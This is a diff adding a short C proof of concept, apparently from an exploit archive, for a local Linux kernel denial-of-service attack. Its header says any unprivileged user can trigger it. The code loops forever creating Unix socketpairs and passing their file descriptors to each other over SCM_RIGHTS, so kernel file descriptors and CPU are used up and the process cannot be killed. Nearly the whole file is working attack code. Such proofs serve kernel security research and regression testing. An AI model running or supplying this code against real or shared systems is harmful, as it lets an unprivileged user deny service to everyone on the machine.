@@ -1,0 +1,64 @@
+/*
+Simple kernel attack using socketpair. easy, 100% reproductiblle, works
+under guest. no way to protect :(
+
+Simple kernel attack using socketpair. easy, 100% reproductiblle,
+works under guest. no way to protect :(
+
+See source attached.
+
+Process become in state 'Running' but not killalble via kill -KILL.
+
+eat 100% CPU, eat all available internal  file descriptors  in kernel :(
+
+-- 
+Segmentation fault
+*/
+
+#include <sys/socket.h>
+#include <sys/un.h>
+
+static int send_fd (int unix_fd, int fd)
+{
+  struct msghdr msgh;
+  struct cmsghdr *cmsg;
+  char buf[CMSG_SPACE (sizeof (fd))];
+  memset (&msgh, 0, sizeof (msgh));
+
+  memset (buf, 0, sizeof (buf));
+
+  msgh.msg_control = buf;
+  msgh.msg_controllen = sizeof (buf);
+
+  cmsg = CMSG_FIRSTHDR (&msgh);
+  cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
+  cmsg->cmsg_level = SOL_SOCKET;
+
+  cmsg->cmsg_type = SCM_RIGHTS;
+
+  msgh.msg_controllen = cmsg->cmsg_len;
+
+  memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
+  return sendmsg (unix_fd, &msgh, 0);
+}
+
+int main ()
+{
+  int fd[2], ff[2];
+
+  int target;
+  if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)==-1)
+    return 1;
+  for (;;)
+  {
+    if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
+        return 2;
+    send_fd (ff[0], fd[0]);
+    send_fd (ff[0], fd[1]);
+
+    close (fd[1]);
+    close (fd[0]);
+    fd[0] = ff[0];
+    fd[1] = ff[1];
+  }
+}
